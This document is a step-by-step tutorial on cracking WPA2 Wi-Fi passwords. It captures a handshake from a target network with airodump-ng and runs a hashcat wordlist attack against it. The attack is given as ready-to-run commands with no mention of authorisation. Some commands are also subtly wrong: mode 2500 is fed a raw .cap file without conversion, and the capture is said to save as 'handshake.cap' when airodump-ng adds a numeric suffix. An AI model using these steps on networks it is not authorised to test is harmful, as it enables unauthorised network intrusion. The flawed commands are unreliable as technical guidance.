# Cracking WPA/WPA2 Passwords with Hashcat

**Hashcat** is another powerful tool for cracking hashed passwords. It is optimized for **GPU acceleration**, which makes it much faster than CPU-based tools for many types of attacks.

In this example, we'll use **Hashcat** to crack a **WPA2 Wi-Fi password**.

## **Step 1: Install Hashcat (if needed)**

Hashcat is also pre-installed in **Kali Linux**, but if you need to install it manually, use the following command:

```bash
sudo apt-get install hashcat
```

## **Step 2: Capture WPA2 Handshake**

Before cracking WPA2 passwords, you need to capture the **handshake** between a device and the Wi-Fi router. This can be done using **aircrack-ng** or **airodump-ng**.

1. Start **airodump-ng** to monitor your wireless network:
   ```bash
   sudo airodump-ng wlan0mon
   ```

2. Once you see a target network, run **airodump-ng** again to capture the handshake when a client connects to the network:
   ```bash
   sudo airodump-ng --bssid <target-AP-MAC> -c <channel> --write handshake wlan0mon
   ```

   This will capture the handshake and save it as `handshake.cap`.

## **Step 3: Crack WPA2 Handshake with Hashcat**

Once you have the `.cap` file containing the handshake, use **Hashcat** to crack the password.

```bash
hashcat -m 2500 -a 0 handshake.cap /path/to/wordlist.txt
```

Explanation:

- `-m 2500`: Specifies the hash mode for WPA2 (this is the mode used for cracking WPA/WPA2 handshakes).
- `-a 0`: This sets the attack mode to **straight attack** (using a wordlist).
- `handshake.cap`: The file containing the captured WPA2 handshake.
- `/path/to/wordlist.txt`: The wordlist file (dictionary) that Hashcat will use to attempt to crack the password.

**Hashcat** will go through the wordlist, attempting each password until it either cracks the password or exhausts the list.

## **Step 4: Check Cracked Password**

If Hashcat successfully cracks the password, it will display it in the terminal. You can also use this command to see the cracked password:

```bash
hashcat -m 2500 --show handshake.cap
```

Output example:
```
<hash>  password123
```
